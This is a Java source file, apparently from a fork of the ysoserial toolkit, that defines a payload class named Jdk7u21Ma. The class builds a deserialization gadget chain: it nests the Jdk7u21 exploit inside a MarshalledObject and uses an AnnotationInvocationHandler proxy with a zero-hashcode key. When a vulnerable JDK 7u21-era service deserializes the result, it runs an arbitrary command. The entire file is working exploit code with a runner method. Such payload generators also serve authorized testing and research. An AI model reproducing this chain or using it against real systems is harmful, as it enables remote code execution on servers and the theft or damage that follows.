package dogeser.payloads;

import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.LinkedHashSet;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutput;
import java.io.ObjectOutputStream;

import javax.xml.transform.Templates;

import dogeser.payloads.annotation.Authors;
import dogeser.payloads.annotation.Dependencies;
import dogeser.payloads.annotation.PayloadTest;
import dogeser.payloads.util.Gadgets;
import dogeser.payloads.util.JavaVersion;
import dogeser.payloads.util.PayloadRunner;
import dogeser.payloads.util.Reflections;


@SuppressWarnings({ "rawtypes", "unchecked" })
@PayloadTest( precondition = "isApplicableJavaVersion")
@Dependencies()
@dogeser.payloads.annotation.Authors({ Authors.FROHOFF })
public class Jdk7u21Ma implements ObjectPayload<Object> {

    public Object getObject(final String command) throws Exception {
        //final Object templates = dogeser.payloads.util.Gadgets.createTemplatesImpl(command);
        final MarshalledObject templates = new MarshalledObject(null);

        Object obj = new Jdk7u21().getObject(command);
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutput objectOutput = null;
        objectOutput = new ObjectOutputStream(byteArrayOutputStream);
        objectOutput.writeObject(obj);
        objectOutput.flush();
        byte[] bytearray = byteArrayOutputStream.toByteArray();
        Reflections.setFieldValue(templates, "objBytes",
                bytearray
        );

        String zeroHashCodeStr = "f5a5a608";
        HashMap map = new HashMap();
        map.put(zeroHashCodeStr, "foo");

        InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
        Reflections.setFieldValue(tempHandler, "type", MarshalledObject.class);
        Map proxy = Gadgets.createProxy(tempHandler, Map.class);
        LinkedHashSet set = new LinkedHashSet(); // maintain order
        set.add(templates);
        set.add(proxy);

        map.put(zeroHashCodeStr, templates); // swap in real object

        return set;
    }

    public static boolean isApplicableJavaVersion() {
        JavaVersion v = JavaVersion.getLocalVersion();
        return v != null && (v.major < 7 || (v.major == 7 && v.update <= 21));
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(Jdk7u21Ma.class, args);
    }

}
